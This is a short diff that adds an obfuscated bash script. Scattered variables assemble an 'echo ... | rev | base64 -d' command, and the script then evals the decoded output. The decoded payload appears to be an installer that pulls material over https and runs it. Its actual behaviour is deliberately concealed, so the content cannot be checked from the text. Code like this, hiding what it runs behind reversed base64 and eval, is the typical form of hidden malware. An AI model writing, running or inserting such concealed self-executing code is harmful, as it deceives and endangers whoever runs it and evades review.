@@ -1,0 +1,4 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogIoNnLjFmcr1SZ1FXY0FGIoNXYitzUvRERtMUQStEIkN2OkNGIgACIgACIgAyRkICIl1CIvh2YlpgIHG5nwDiLPR1UFBSQHVEUgkFIBlEUPNEIPx0TTBSQNFkUH9kUQBCTFBiUBRVVDVkSFByUBJVRJVVUgUUVRByUFZFIBRUQDByQkICIl1CIvh2YlpgchVGbjpwYuMXZ4JXZ4ByclhnclhHIv1CIjN2Z7oCI4tCIk9WboN2OTVEWSVEWgQ2Y7IXYlx2Y7QXan5yUFhlUFh1LYdzNRFkRYRUQINEWv02bj5iY1hGdpd2LvozcwRHdoBSZu9GbjBCdpd2OyFWZsN2O51CIn5WYsNGIsxWY0NnbpByZrB3OyFWZsN2OoNXYiBCbsFGdz5Wagc2awtjchVGbjtTetACdpdGIsxWY0NnbpByZrBnCyFWZsNmCn0GMbNzMww1J9clCn0mNzsTMbNzMww1J9MkCn0WNzsTMbNzMww1J90kCn0GNzsTMbNzMww1J9IkCn02MzsTMbNzMww1J9klCn0mMzsTMbNzMww1J9ckCn0WMzsTMbNzMww1J9IlCn0GMzsTMbNzMww1J94kCKg2chJ2LulmYvEyI
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
